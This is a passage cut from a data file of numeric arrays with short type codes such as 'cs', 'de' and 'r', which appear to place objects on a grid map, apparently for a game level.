24, 1], [1, "cs", 2, 77, 24, 1], [1, "cs", 2, 77, 25, 1], [1, "cs", 2, 77, 26, 1], [1, "cs", 1, 75, 27, 1], [1, "cs", 3, 76, 27, 1], [1, "cs", 2, 67, 24, 1], [1, "cs", 2, 66, 24, 1], [1, "cs", 2, 73, 26, 1], [1, "cs", 2, 74, 27, 1], [1, "cs", 2, 74, 25, 1], [1, "cs", 2, 66, 19, 1], [1, "cs", 2, 66, 20, 1], [1, "cs", 2, 66, 21, 1], [1, "cs", 2, 67, 18, 1], [1, "cs", 2, 67, 22, 1], [1, "cs", 0, 77, 36, 1], [1, "cs", 0, 77, 32, 1], [1, "cs", 1, 75, 35, 1], [1, "cs", 2, 75, 36, 1], [1, "cs", 2, 76, 36, 1], [1, "cs", 2, 77, 35, 1], [1, "cs", 2, 77, 34, 1], [1, "cs", 2, 76, 35, 1], [1, "cs", 2, 77, 33, 1], [1, "cs", 2, 77, 31, 1], [1, "cs", 0, 77, 29, 1], [1, "cs", 0, 71, 32, 1], [1, "cs", 0, 76, 34, 1], [1, "cs", 2, 77, 30, 1], [1, "cs", 2, 77, 28, 1], [1, "cs", 2, 76, 28, 1], [1, "cs", 2, 75, 28, 1], [1, "cs", 2, 76, 29, 1], [1, "cs", 2, 76, 33, 1], [1, "cs", 2, 70, 32, 1], [1, "cs", 2, 69, 31, 1], [1, "cs", 0, 68, 31, 1], [1, "cs", 2, 67, 31, 1], [1, "cs", 2, 67, 30, 1], [1, "cs", 2, 69, 32, 1], [1, "cs", 1, 67, 32, 1], [1, "cs", 2, 68, 32, 1], [1, "cs", 2, 66, 32, 1], [1, "cs", 2, 66, 33, 1], [1, "cs", 2, 67, 33, 1], [1, "cs", 2, 70, 33, 1], [1, "cs", 2, 69, 33, 1], [1, "cs", 2, 68, 33, 1], [1, "cs", 0, 68, 34, 1], [1, "cs", 1, 66, 35, 1], [1, "cs", 2, 67, 34, 1], [1, "cs", 2, 66, 34, 1], [1, "cs", 2, 65, 35, 1], [1, "cs", 2, 64, 36, 1], [1, "cs", 2, 65, 36, 1], [1, "cs", 2, 67, 35, 1], [1, "cs", 2, 66, 36, 1], [1, "cs", 2, 69, 34, 1], [1, "cs", 2, 68, 35, 1], [1, "cs", 2, 76, 9, 1], [1, "cs", 2, 77, 9, 1], [1, "cs", 2, 77, 8, 1], [1, "cs", 2, 77, 10, 1], [1, "cs", 2, 78, 8, 1], [1, "cs", 2, 78, 9, 1], [1, "cs", 2, 78, 10, 1], [1, "cs", 2, 78, 11, 1], [1, "cs", 2, 78, 12, 1], [1, "cs", 2, 78, 13, 1], [1, "cs", 0, 79, 9, 1], [1, "cs", 1, 79, 11, 1], [1, "cs", 3, 79, 8, 1], [1, "cs", 3, 79, 10, 1], [1, "cs", 3, 79, 12, 1], [1, "cs", 3, 80, 8, 1], [1, "cs", 1, 80, 10, 1], [1, "cs", 2, 80, 9, 1], [1, "cs", 2, 80, 11, 1], [1, "cs", 2, 81, 8, 1], [1, "cs", 2, 81, 9, 1], [1, "cs", 2, 81, 10, 1], [1, "cs", 2, 78, 14, 1], [1, "cs", 2, 79, 13, 1], [1, "cs", 2, 78, 15, 1], [1, "cs", 2, 80, 12, 1], [1, "cs", 0, 79, 14, 1], [1, "cs", 0, 82, 9, 1], [1, "cs", 2, 82, 8, 1], [1, "cs", 2, 82, 10, 1], [1, "cs", 2, 81, 11, 1], [1, "cs", 3, 80, 13, 1], [1, "cs", 1, 78, 30, 1], [1, "cs", 1, 78, 34, 1], [1, "cs", 1, 78, 27, 1], [1, "cs", 0, 78, 25, 1], [1, "cs", 0, 79, 29, 1], [1, "cs", 0, 79, 32, 1], [1, "cs", 0, 79, 35, 1], [1, "cs", 2, 78, 35, 1], [1, "cs", 2, 78, 36, 1], [1, "cs", 2, 79, 34, 1], [1, "cs", 2, 78, 33, 1], [1, "cs", 2, 79, 33, 1], [1, "cs", 2, 78, 32, 1], [1, "cs", 2, 78, 31, 1], [1, "cs", 2, 79, 31, 1], [1, "cs", 2, 79, 30, 1], [1, "cs", 2, 78, 29, 1], [1, "cs", 2, 78, 28, 1], [1, "cs", 2, 79, 28, 1], [1, "cs", 2, 79, 27, 1], [1, "cs", 2, 78, 26, 1], [1, "cs", 2, 79, 26, 1], [1, "cs", 2, 78, 24, 1], [1, "cs", 2, 80, 34, 1], [1, "cs", 2, 80, 33, 1], [1, "cs", 2, 80, 31, 1], [1, "cs", 2, 80, 30, 1], [1, "cs", 2, 80, 32, 1], [1, "cs", 2, 80, 29, 1], [1, "cs", 2, 80, 28, 1], [1, "cs", 2, 80, 27, 1], [1, "cs", 0, 81, 30, 1], [1, "cs", 1, 81, 32, 1], [1, "cs", 1, 81, 28, 1], [1, "cs", 2, 81, 29, 1], [1, "cs", 2, 81, 31, 1], [1, "cs", 2, 81, 33, 1], [1, "cs", 2, 82, 30, 1], [1, "cs", 2, 82, 31, 1], [1, "cs", 2, 82, 32, 1], [1, "cs", 0, 37, 36, 1], [1, "cs", 2, 38, 36, 1], [1, "cs", 2, 37, 35, 1], [1, "cs", 2, 36, 36, 1], [1, "cs", 2, 34, 35, 1], [1, "cs", 2, 35, 35, 1], [1, "cs", 2, 36, 35, 1], [1, "cs", 0, 33, 34, 1], [1, "cs", 1, 35, 34, 1], [1, "cs", 2, 36, 34, 1], [1, "cs", 2, 34, 34, 1], [1, "cs", 2, 36, 33, 1], [1, "cs", 2, 35, 33, 1], [1, "cs", 2, 34, 33, 1], [1, "cs", 2, 33, 33, 1], [1, "cs", 2, 31, 32, 1], [1, "cs", 1, 36, 32, 1], [1, "cs", 1, 32, 32, 1], [1, "cs", 2, 35, 32, 1], [1, "cs", 2, 33, 32, 1], [1, "cs", 2, 32, 33, 1], [1, "cs", 2, 33, 31, 1], [1, "cs", 2, 34, 31, 1], [1, "cs", 2, 35, 31, 1], [1, "cs", 0, 34, 32, 1], [1, "cs", 2, 35, 30, 1], [1, "cs", 1, 39, 23, 1], [1, "cs", 3, 39, 22, 1], [1, "cs", 3, 36, 24, 1], [1, "cs", 3, 35, 24, 1], [1, "cs", 2, 34, 23, 1], [1, "cs", 2, 35, 23, 1], [1, "cs", 2, 36, 20, 1], [1, "cs", 2, 36, 21, 1], [1, "cs", 2, 35, 22, 1], [1, "cs", 2, 35, 16, 1], [1, "cs", 2, 34, 16, 1], [1, "cs", 2, 33, 16, 1], [1, "cs", 0, 34, 17, 1], [1, "cs", 0, 32, 15, 1], [1, "cs", 2, 31, 14, 1], [1, "cs", 3, 30, 13, 1], [1, "cs", 1, 33, 15, 1], [1, "cs", 1, 31, 13, 1], [1, "cs", 2, 32, 14, 1], [1, "cs", 0, 31, 8, 1], [1, "cs", 2, 32, 8, 1], [1, "cs", 2, 25, 13, 1], [1, "cs", 0, 25, 12, 1], [1, "cs", 2, 25, 11, 1], [1, "cs", 3, 25, 10, 1], [1, "cs", 0, 25, 9, 1], [1, "cs", 2, 25, 8, 1], [1, "cs", 2, 26, 8, 1], [1, "cs", 2, 27, 8, 1], [1, "cs", 2, 28, 8, 1], [1, "cs", 2, 29, 8, 1], [1, "cs", 2, 30, 8, 1], [1, "cs", 2, 26, 9, 1], [1, "cs", 2, 27, 9, 1], [1, "cs", 2, 26, 10, 1], [1, "cs", 1, 27, 10, 1], [1, "cs", 3, 28, 9, 1], [1, "cs", 3, 25, 14, 1], [1, "cs", 0, 25, 15, 1], [1, "cs", 2, 26, 15, 1], [1, "cs", 3, 27, 16, 1], [1, "cs", 0, 28, 17, 1], [1, "cs", 1, 29, 18, 1], [1, "cs", 2, 26, 16, 1], [1, "cs", 2, 25, 16, 1], [1, "cs", 2, 27, 17, 1], [1, "cs", 2, 26, 17, 1], [1, "cs", 1, 27, 18, 1], [1, "cs", 2, 28, 18, 1], [1, "cs", 2, 30, 19, 1], [1, "cs", 2, 29, 19, 1], [1, "cs", 2, 24, 14, 1], [1, "cs", 2, 24, 15, 1], [1, "cs", 0, 23, 14, 1], [1, "cs", 2, 24, 10, 1], [1, "cs", 2, 24, 11, 1], [1, "cs", 2, 24, 12, 1], [1, "cs", 2, 24, 13, 1], [1, "cs", 1, 23, 10, 1], [1, "cs", 0, 22, 8, 1], [1, "cs", 0, 22, 12, 1], [1, "cs", 1, 23, 8, 1], [1, "cs", 2, 24, 8, 1], [1, "cs", 2, 24, 9, 1], [1, "cs", 2, 23, 9, 1], [1, "cs", 2, 22, 9, 1], [1, "cs", 2, 22, 10, 1], [1, "cs", 2, 22, 11, 1], [1, "cs", 2, 23, 11, 1], [1, "cs", 2, 23, 12, 1], [1, "cs", 2, 23, 13, 1], [1, "cs", 2, 22, 13, 1], [1, "cs", 2, 21, 9, 1], [1, "cs", 2, 21, 8, 1], [1, "cs", 2, 29, 25, 1], [1, "cs", 2, 25, 24, 1], [1, "cs", 2, 26, 25, 1], [1, "cs", 2, 27, 25, 1], [1, "cs", 0, 28, 25, 1], [1, "cs", 1, 25, 23, 1], [1, "cs", 2, 26, 24, 1], [1, "cs", 0, 24, 25, 1], [1, "cs", 3, 23, 24, 1], [1, "cs", 3, 24, 24, 1], [1, "cs", 3, 25, 25, 1], [1, "cs", 3, 23, 25, 1], [1, "cs", 1, 22, 26, 1], [1, "cs", 1, 26, 26, 1], [1, "cs", 1, 29, 26, 1], [1, "cs", 2, 23, 26, 1], [1, "cs", 2, 24, 26, 1], [1, "cs", 2, 25, 26, 1], [1, "cs", 2, 27, 26, 1], [1, "cs", 2, 28, 26, 1], [1, "cs", 2, 30, 26, 1], [1, "cs", 2, 29, 27, 1], [1, "cs", 2, 28, 28, 1], [1, "cs", 1, 26, 29, 1], [1, "cs", 0, 28, 27, 1], [1, "cs", 2, 27, 28, 1], [1, "cs", 2, 27, 27, 1], [1, "cs", 2, 26, 28, 1], [1, "cs", 2, 26, 27, 1], [1, "cs", 2, 25, 28, 1], [1, "cs", 2, 25, 27, 1], [1, "cs", 2, 23, 27, 1], [1, "cs", 2, 22, 27, 1], [1, "cs", 2, 24, 27, 1], [1, "cs", 0, 24, 28, 1], [1, "cs", 0, 25, 32, 1], [1, "cs", 1, 24, 30, 1], [1, "cs", 2, 25, 31, 1], [1, "cs", 2, 25, 30, 1], [1, "cs", 2, 25, 29, 1], [1, "cs", 2, 24, 29, 1], [1, "cs", 2, 23, 29, 1], [1, "cs", 2, 26, 33, 1], [1, "cs", 0, 26, 34, 1], [1, "cs", 2, 27, 35, 1], [1, "cs", 2, 22, 28, 1], [1, "cs", 2, 23, 28, 1], [1, "cs", 2, 24, 31, 1], [1, "cs", 2, 24, 32, 1], [1, "cs", 2, 25, 33, 1], [1, "cs", 2, 26, 35, 1], [1, "cs", 2, 24, 33, 1], [1, "cs", 2, 25, 34, 1], [1, "cs", 1, 22, 29, 1], [1, "cs", 1, 24, 34, 1], [1, "cs", 0, 23, 35, 1], [1, "cs", 2, 25, 35, 1], [1, "cs", 2, 24, 35, 1], [1, "cs", 2, 23, 34, 1], [1, "cs", 2, 23, 33, 1], [1, "cs", 0, 22, 33, 1], [1, "cs", 1, 23, 32, 1], [1, "cs", 2, 22, 32, 1], [1, "cs", 2, 23, 31, 1], [1, "cs", 2, 23, 30, 1], [1, "cs", 2, 22, 30, 1], [1, "cs", 2, 22, 31, 1], [1, "cs", 1, 21, 31, 1], [1, "cs", 0, 21, 29, 1], [1, "cs", 2, 21, 30, 1], [1, "cs", 2, 24, 36, 1], [1, "cs", 2, 26, 36, 1], [1, "cs", 2, 25, 36, 1], [1, "cs", 2, 27, 36, 1], [1, "cs", 2, 28, 36, 1], [1, "d", 2, 83, 65, 1], [1, "d", 2, 16, 67, 1], [1, "g", 0, 15, 17, 1], [1, "s", 0, 18, 13, 1], [1, "s", 0, 85, 11, 1], [1, "f", 0, 41, 102, 1], [1, "f", 0, 42, 124, 1], [1, "f", 0, 64, 116, 1], [1, "f", 0, 74, 104, 1], [1, "f", 0, 70, 87, 1], [1, "f", 0, 27, 96, 1], [1, "f", 0, 22, 79, 1], [1, "f", 0, 20, 117, 1], [1, "f", 0, 30, 137, 1], [1, "f", 0, 59, 146, 1], [1, "f", 0, 52, 147, 1], [1, "f", 0, 20, 149, 1], [1, "f", 0, 36, 146, 1], [1, "f", 0, 62, 124, 1], [1, "g", 1, 34, 121, 1], [1, "g", 1, 52, 116, 1], [1, "g", 1, 78, 116, 1], [1, "g", 1, 71, 129, 1], [1, "s", 0, 53, 100, 1], [1, "s", 0, 73, 111, 1], [1, "s", 0, 77, 126, 1], [1, "s", 0, 48, 90, 1], [1, "s", 0, 19, 102, 1], [1, "s", 0, 18, 127, 1], [1, "s", 0, 35, 159, 1], [1, "s", 0, 65, 54, 1], [1, "s", 0, 44, 52, 1], [1, "s", 0, 26, 51, 1], [1, "f", 1, 56, 136, 1], [1, "f", 1, 41, 133, 1], [1, "f", 1, 80, 120, 1], [1, "f", 1, 16, 117, 1], [1, "f", 1, 13, 99, 1], [1, "f", 1, 17, 89, 1], [1, "f", 1, 90, 98, 1], [1, "f", 1, 84, 95, 1], [1, "f", 1, 16, 57, 1], [1, "f", 1, 77, 53, 1], [1, "d", 1, 48, 35, 1], [1, "de", 8, 33, 13, 0], [1, "de", 8, 30, 9, 0], [1, "de", 9, 32, 30, 0], [1, "de", 10, 30, 25, 0], [1, "de", 10, 33, 21, 0], [1, "de", 8, 31, 34, 0], [1, "de", 8, 67, 29, 0], [1, "de", 9, 70, 22, 0], [1, "de", 10, 70, 16, 0], [1, "de", 10, 75, 11, 0], [1, "de", 8, 68, 10, 0], [1, "de", 8, 75, 30, 0], [1, "de", 11, 71, 33, 0], [1, "de", 11, 72, 25, 0], [1, "de", 11, 64, 25, 0], [1, "de", 11, 52, 10, 0], [1, "de", 11, 31, 15, 0], [1, "de", 30, 29, 14, 0], [1, "de", 30, 36, 15, 0], [1, "de", 30, 34, 29, 0], [1, "de", 30, 30, 29, 0], [1, "de", 30, 71, 29, 0], [1, "de", 28, 68, 25, 0], [1, "de", 28, 75, 15, 0], [1, "de", 27, 67, 19, 0], [1, "de", 29, 72, 10, 0], [1, "de", 29, 75, 32, 0], [1, "de", 29, 32, 20, 0], [1, "fo", 1, 39, 12, 0], [1, "fo", 1, 34, 14, 0], [1, "fo", 1, 74, 28, 0], [1, "fo", 2, 74, 29, 0], [1, "fo", 2, 69, 30, 0], [1, "fo", 2, 77, 22, 0], [1, "fo", 2, 74, 21, 0], [1, "fo", 2, 76, 18, 0], [1, "fo", 1, 78, 17, 0], [1, "fo", 1, 28, 19, 0], [1, "fo", 2, 27, 24, 0], [1, "fo", 2, 24, 17, 0], [1, "fo", 2, 29, 21, 0], [1, "fo", 1, 27, 32, 0], [1, "fo", 2, 30, 33, 0], [1, "fo", 1, 29, 28, 0], [1, "fo", 2, 28, 31, 0], [1, "fo", 2, 20, 24, 0], [1, "fo", 2, 20, 26, 0], [1, "fo", 2, 23, 16, 0], [1, "fo", 2, 11, 25, 0], [1, "de", 33, 29, 22, 0], [1, "de", 34, 32, 25, 0], [1, "de", 34, 30, 18, 0], [1, "de", 33, 78, 18, 0], [1, "de", 33, 73, 35, 0], [1, "de", 36, 72, 23, 0], [1, "de", 35, 25, 18, 0], [1, "d", 1, 83, 41, 1], [1, "d", 1, 17, 40, 1], [1, "cs", 2, 224, 104, 1], [1, "cs", 0, 224, 105, 1], [1, "cs", 3, 224, 106, 1], [1, "la", 3, 216, 128, 1], [1, "la", 0, 215, 126, 1], [1, "s", 0, 216, 130, 1], [1, "s", 1, 217, 129, 1], [1, "s", 0, 218, 128, 1], [1, "s", 1, 217, 127, 1], [1, "s", 0, 217, 126, 1], [1, "s", 1, 217, 125, 1], [1, "s", 0, 216, 124, 1], [1, "s", 1, 215, 124, 1], [1, "s", 0, 214, 124, 1], [1, "s", 1, 213, 125, 1], [1, "s", 0, 213, 126, 1], [1, "plm", 2, 217, 130, 0], [1, "plm", 2, 212, 125, 0], [1, "p", 0, 214, 134, 1], [1, "s", 1, 211, 126, 1], [1, "b", 1, 45, 277, 0], [1, "b", 1, 50, 286, 0], [1, "b", 2, 51, 284, 0], [1, "b", 1, 47, 287, 0], [1, "b", 0, 39, 285, 0], [1, "b", 3, 40, 283, 0], [1, "b", 0, 52, 283, 0], [1, "b", 1, 51, 280, 0], [1, "g", 0, 45, 269, 1], [1, "p", 0, 55, 281, 1], [1, "b", 1, 5, 172, 0], [1, "b", 2, 6, 172, 0], [1, "t", 5, 6, 171, 0], [1, "t", 1, 5, 170, 0], [1, "t", 1, 5, 164, 0], [1, "t", 3, 6, 164, 0], [1, "b", 0, 6, 165, 0], [1, "t", 3, 5, 165, 0], [1, "b", 2, 6, 166, 0], [1, "t", 4, 5, 166, 0], [1, "t", 4, 6, 167, 0], [1, "t", 2, 6, 168, 0], [1, "t", 0, 6, 169, 0], [1, "t", 4, 6, 170, 0], [1, "t", 0, 5, 167, 0], [1, "t", 2, 5, 169, 0], [1, "b", 0, 5, 168, 0], [1, "s", 1, 7, 153, 1], [1, "s", 2, 7, 151, 1], [1, "de", 5, 7, 152, 0], [1, "t", 1, 5, 154, 0], [1, "b", 0, 6, 154, 0], [1, "t", 2, 6, 155, 0], [1, "b", 2, 6, 156, 0], [1, "t", 2, 5, 157, 0], [1, "t", 4, 5, 155, 0], [1, "b", 0, 6, 157, 0], [1, "t", 1, 5, 156, 0], [1, "t", 5, 6, 158, 0], [1, "b", 2, 6, 159, 0], [1, "b", 0, 6, 162, 0], [1, "t", 4, 6, 163, 0], [1, "t", 4, 6, 161, 0], [1, "b", 1, 6, 160, 0], [1, "b", 2, 5, 163, 0], [1, "b", 2, 5, 158, 0], [1, "b", 2, 5, 161, 0], [1, "t", 1, 5, 162, 0], [1, "t", 1, 5, 160, 0], [1, "b", 1, 85, 176, 0], [1, "b", 2, 83, 178, 0], [1, "s", 1, 82, 177, 1], [1, "b", 0, 76, 172, 0], [1, "b", 3, 76, 174, 0], [1, "t", 3, 73, 174, 0], [1, "t", 5, 72, 175, 0], [1, "t", 5, 87, 173, 0], [1, "de", 2, 76, 175, 0], [1, "de", 3, 77, 171, 0], [1, "de", 3, 86, 177, 0], [1, "de", 2, 71, 175, 0], [1, "s", 1, 70, 174, 1], [1, "r", 48, 174, 0], [1, "r", 49, 175, 0], [1, "r", 50, 175, 0], [1, "r", 51, 175, 0], [1, "r", 51, 174, 0], [1, "r", 50, 174, 0], [1, "r", 49, 174, 0], [1, "r", 52, 175, 0], [1, "r", 52, 176, 0], [1, "r", 51, 176, 0], [1, "r", 50, 176, 0], [1, "r", 49, 176, 0], [1, "r", 48, 175, 0], [1, "r", 47, 175, 0], [1, "r", 48, 176, 0], [1, "r", 69, 163, 0], [1, "r", 70, 163, 0], [1, "r", 71, 163, 0], [1, "r", 73, 163, 0], [1, "r", 72, 163, 0], [1, "r", 73, 164, 0], [1, "r", 72, 164, 0], [1, "r", 71, 164, 0], [1, "r", 70, 164, 0], [1, "r", 69, 164, 0], [1, "r", 68, 164, 0], [1, "r", 68, 165, 0], [1, "r", 69, 165, 0], [1, "r", 70, 165, 0], [1, "r", 71, 165, 0], [1, "r", 72, 165, 0], [1, "r", 74, 164, 0], [1, "r", 73, 165, 0], [1, "r", 72, 166, 0], [1, "r", 71, 166, 0], [1, "r", 70, 166, 0], [1, "r", 74, 165, 0], [1, "r", 24, 164, 0], [1, "r", 25, 164, 0], [1, "r", 27, 164, 0], [1, "r", 26, 164, 0], [1, "r", 28, 165, 0], [1, "r", 26, 165, 0], [1, "r", 27, 165, 0], [1, "r", 25, 165, 0], [1, "r", 24, 165, 0], [1, "r", 23, 165, 0], [1, "r", 22, 165, 0], [1, "r", 21, 165, 0], [1, "r", 21, 166, 0], [1, "r", 22, 166, 0], [1, "r", 23, 166, 0], [1, "r", 24, 166, 0], [1, "r", 25, 166, 0], [1, "r", 26, 166, 0], [1, "r", 27, 166, 0], [1, "r", 28, 166, 0], [1, "r", 28, 167, 0], [1, "r", 26, 167, 0], [1, "r", 25, 167, 0], [1, "r", 24, 167, 0], [1, "r", 23, 167, 0], [1, "r", 22, 167, 0], [1, "r", 27, 167, 0], [1, "r", 29, 166, 0], [1, "r", 29, 167, 0], [1, "r", 28, 168, 0], [1, "r", 27, 168, 0], [1, "r", 26, 168, 0], [1, "r", 25, 168, 0], [1, "r", 24, 168, 0], [1, "r", 23, 168, 0], [1, "r", 27, 169, 0], [1, "r", 26, 169, 0], [1, "r", 25, 169, 0], [1, "r", 24, 169, 0], [1, "r", 23, 169, 0], [1, "r", 22, 168, 0], [1, "r", 21, 167, 0], [1, "s", 1, 52, 174, 1], [1, "t", 3, 50, 177, 0], [1, "t", 4, 49, 177, 0], [1, "b", 0, 47, 174, 0], [1, "b", 0, 69, 166, 0], [1, "t", 2, 68, 166, 0], [1, "t", 5, 74, 163, 0], [1, "t", 1, 73, 162, 0], [1, "s", 0, 73, 166, 1], [1, "s", 2, 76, 165, 1], [1, "g", 2, 59, 175, 1], [1, "p", 0, 78, 168, 1], [1, "p", 0, 61, 162, 1], [1, "p", 0, 42, 170, 1], [1, "p", 0, 20, 174, 1], [1, "p", 0, 16, 160, 1], [1, "b", 1, 23, 164, 0], [1, "b", 1, 28, 169, 0], [1, "b", 2, 29, 168, 0], [1, "b", 2, 16, 170, 0], [1, "t", 1, 15, 171, 0], [1, "t", 5, 13, 175, 0], [1, "t", 5, 19, 166, 0], [1, "t", 5, 26, 163, 0], [1, "s", 1, 29, 165, 1], [1, "t", 5, 11, 167, 0], [1, "t", 0, 29, 176, 0], [1, "b", 2, 30, 175, 0], [1, "t", 2, 24, 177, 0], [1, "b", 1, 37, 174, 0], [1, "b", 0, 35, 172, 0], [1, "b", 3, 37, 170, 0], [1, "t", 4, 38, 169, 0], [1, "t", 4, 34, 173, 0], [1, "t", 5, 38, 175, 0], [1, "b", 2, 39, 173, 0], [1, "t", 3, 37, 176, 0], [1, "t", 4, 30, 168, 0], [1, "s", 2, 35, 176, 1], [1, "s", 1, 41, 175, 1], [1, "b", 2, 53, 176, 0], [1, "t", 5, 55, 173, 0], [1, "t", 5, 45, 170, 0], [1, "b", 1, 53, 162, 0], [1, "b", 0, 50, 164, 0], [1, "t", 2, 54, 163, 0], [1, "t", 3, 49, 165, 0], [1, "t", 4, 48, 160, 0], [1, "t", 4, 57, 164, 0], [1, "t", 4, 66, 162, 0], [1, "b", 1, 86, 161, 0], [1, "b", 2, 81, 163, 0], [1, "t", 3, 85, 162, 0], [1, "t", 5, 81, 162, 0], [1, "t", 5, 88, 163, 0], [1, "t", 1, 84, 166, 0], [1, "t", 5, 72, 160, 0], [1, "t", 5, 70, 170, 0], [1, "s", 1, 57, 162, 1], [1, "b", 1, 39, 161, 0], [1, "b", 0, 34, 164, 0], [1, "b", 2, 54, 164, 0], [1, "t", 1, 59, 169, 0], [1, "t", 3, 60, 170, 0], [1, "t", 4, 63, 169, 0], [1, "t", 4, 63, 174, 0], [1, "t", 1, 62, 175, 0], [1, "t", 5, 40, 162, 0], [1, "t", 1, 63, 180, 0], [1, "t", 2, 64, 179, 0], [1, "t", 2, 35, 165, 0], [1, "s", 1, 63, 173, 1], [1, "s", 2, 40, 165, 1], [1, "b", 0, 46, 169, 0], [1, "de", 22, 74, 168, 0], [1, "de", 22, 86, 168, 0], [1, "de", 22, 83, 175, 0], [1, "de", 22, 78, 175, 0], [1, "de", 19, 72, 176, 0], [1, "de", 19, 68, 168, 0], [1, "de", 19, 65, 163, 0], [1, "de", 19, 75, 162, 0], [1, "de", 19, 80, 162, 0], [1, "de", 19, 88, 159, 0], [1, "de", 19, 87, 164, 0], [1, "de", 19, 61, 177, 0], [1, "de", 19, 59, 172, 0], [1, "de", 19, 59, 167, 0], [1, "de", 19, 53, 165, 0], [1, "de", 19, 56, 163, 0], [1, "de", 19, 51, 161, 0], [1, "de", 19, 48, 167, 0], [1, "de", 19, 47, 170, 0], [1, "de", 19, 41, 163, 0], [1, "de", 19, 37, 161, 0], [1, "de", 19, 36, 166, 0], [1, "de", 19, 36, 171, 0], [1, "de", 19, 34, 174, 0], [1, "de", 19, 40, 172, 0], [1, "de", 19, 38, 177, 0], [1, "de", 19, 42, 176, 0], [1, "de", 19, 53, 178, 0], [1, "de", 19, 53, 172, 0], [1, "de", 19, 64, 181, 0], [1, "de", 19, 64, 175, 0], [1, "de", 19, 79, 172, 0], [1, "de", 19, 30, 170, 0], [1, "de", 19, 17, 168, 0], [1, "de", 19, 14, 173, 0], [1, "de", 19, 12, 162, 0], [1, "de", 19, 9, 167, 0], [1, "de", 19, 20, 161, 0], [1, "de", 19, 27, 162, 0], [1, "de", 19, 83, 195, 0], [1, "de", 2, 85, 163, 0], [1, "de", 2, 80, 164, 0], [1, "de", 2, 84, 169, 0], [1, "de", 2, 55, 165, 0], [1, "de", 3, 46, 163, 0], [1, "de", 2, 66, 169, 0], [1, "de", 0, 63, 175, 0], [1, "de", 0, 34, 164, 0], [1, "de", 0, 18, 160, 0], [1, "de", 2, 40, 160, 0], [1, "de", 2, 53, 160, 0], [1, "de", 2, 14, 170, 0], [1, "de", 2, 19, 175, 0], [1, "de", 2, 23, 176, 0], [1, "de", 5, 60, 147, 0], [1, "de", 33, 59, 160, 0], [1, "de", 33, 85, 157, 0], [1, "de", 33, 29, 143, 0], [1, "de", 33, 62, 140, 0], [1, "de", 33, 43, 127, 0], [1, "de", 33, 18, 129, 0], [1, "de", 33, 50, 134, 0], [1, "de", 33, 79, 127, 0], [1, "de", 33, 89, 139, 0], [1, "b", 1, 44, 156, 0], [1, "t", 2, 45, 157, 0], [1, "b", 0, 75, 156, 0], [1, "t", 3, 76, 157, 0], [1, "t", 5, 62, 157, 0], [1, "t", 5, 79, 156, 0], [1, "t", 5, 41, 156, 0], [1, "b", 1, 28, 156, 0], [1, "t", 2, 27, 157, 0], [1, "t", 4, 21, 156, 0], [1, "t", 4, 56, 159, 0], [1, "f", 1, 94, 153, 1], [1, "f", 2, 93, 153, 1], [1, "f", 2, 99, 153, 1], [1, "f", 1, 98, 153, 1], [1, "f", 0, 97, 153, 1], [1, "f", 1, 96, 153, 1], [1, "s", 1, 7, 149, 1], [1, "de", 4, 7, 150, 0], [1, "b", 3, 43, 281, 0], [1, "de", 50, 24, 39, 0], [1, "de", 50, 21, 39, 0], [1, "de", 50, 22, 43, 0], [1, "de", 50, 15, 34, 0], [1, "de", 50, 18, 26, 0], [1, "de", 50, 44, 42, 0], [1, "de", 50, 57, 39, 0], [1, "de", 50, 62, 43, 0], [1, "de", 50, 77, 44, 0], [1, "de", 50, 71, 41, 0], [1, "de", 50, 55, 39, 0], [1, "de", 50, 22, 39, 0], [1, "de", 50, 20, 41, 0], [1, "de", 50, 18, 21, 0], [1, "de", 50, 15, 21, 0], [1, "de", 50, 18, 19, 0], [1, "de", 50, 17, 17, 0], [1, "de", 50, 18, 10, 0], [1, "de", 50, 18, 9, 0], [1, "de", 50, 52, 41, 0], [1, "de", 50, 82, 39, 0], [1, "de", 50, 86, 38, 0], [1, "de", 50, 84, 31, 0], [1, "de", 50, 86, 30, 0], [1, "de", 50, 84, 26, 0], [1, "de", 50, 86, 23, 0], [1, "de", 50, 86, 14, 0], [1, "de", 50, 29, 42, 0], [1, "de", 9, 74, 37, 0], [1, "de", 9, 76, 22, 0], [1, "de", 10, 79, 24, 0], [1, "de", 11, 77, 17, 0], [1, "de", 36, 81, 25, 0], [1, "de", 36, 80, 36, 0], [1, "de", 36, 21, 36, 0], [1, "de", 28, 23, 22, 0], [1, "de", 28, 27, 31, 0], [1, "de", 28, 69, 36, 0], [1, "de", 28, 80, 20, 0], [1, "de", 51, 24, 155, 0], [1, "de", 51, 7, 154, 0], [1, "de", 51, 11, 154, 0], [1, "de", 51, 12, 156, 0], [1, "de", 51, 16, 154, 0], [1, "de", 51, 20, 154, 0], [1, "de", 51, 23, 154, 0], [1, "de", 51, 18, 157, 0], [1, "de", 51, 31, 154, 0], [1, "de", 51, 32, 157, 0], [1, "de", 51, 86, 154, 0], [1, "de", 51, 88, 156, 0], [1, "de", 51, 82, 154, 0], [1, "de", 51, 80, 154, 0], [1, "de", 51, 77, 154, 0], [1, "de", 51, 74, 154, 0], [1, "de", 51, 71, 154, 0], [1, "de", 51, 67, 154, 0], [1, "de", 51, 60, 154, 0], [1, "de", 51, 57, 154, 0], [1, "de", 51, 65, 154, 0], [1, "de", 51, 68, 156, 0], [1, "de", 51, 59, 156, 0], [1, "de", 51, 55, 154, 0], [1, "de", 51, 54, 154, 0], [1, "de", 51, 52, 154, 0], [1, "de", 51, 55, 155, 0], [1, "de", 51, 54, 157, 0], [1, "de", 51, 49, 154, 0], [1, "de", 51, 46, 154, 0], [1, "de", 51, 44, 154, 0], [1, "de", 51, 43, 154, 0], [1, "de", 51, 41, 154, 0], [1, "de", 51, 38, 154, 0], [1, "de", 51, 39, 156, 0], [1, "de", 51, 34, 154, 0], [1, "de", 5, 19, 142, 0], [1, "de", 5, 37, 147, 0], [1, "de", 7, 53, 147, 0], [1, "de", 6, 69, 150, 0], [1, "de", 4, 94, 148, 0], [1, "de", 4, 66, 147, 0], [1, "de", 4, 10, 145, 0], [1, "de", 4, 28, 137, 0], [1, "de", 4, 15, 137, 0], [1, "de", 4, 48, 134, 0], [1, "de", 5, 67, 135, 0], [1, "de", 34, 84, 155, 0], [1, "de", 35, 70, 156, 0], [1, "de", 35, 51, 156, 0], [1, "de", 35, 56, 157, 0], [1, "de", 35, 65, 159, 0], [1, "de", 35, 23, 156, 0], [1, "de", 35, 15, 155, 0], [1, "de", 35, 8, 155, 0], [1, "de", 33, 13, 155, 0], [1, "de", 33, 33, 158, 0], [1, "de", 36, 78, 155, 0], [1, "de", 36, 87, 157, 0], [1, "fo", 1, 73, 36, 0], [1, "fo", 1, 80, 24, 0], [1, "fo", 2, 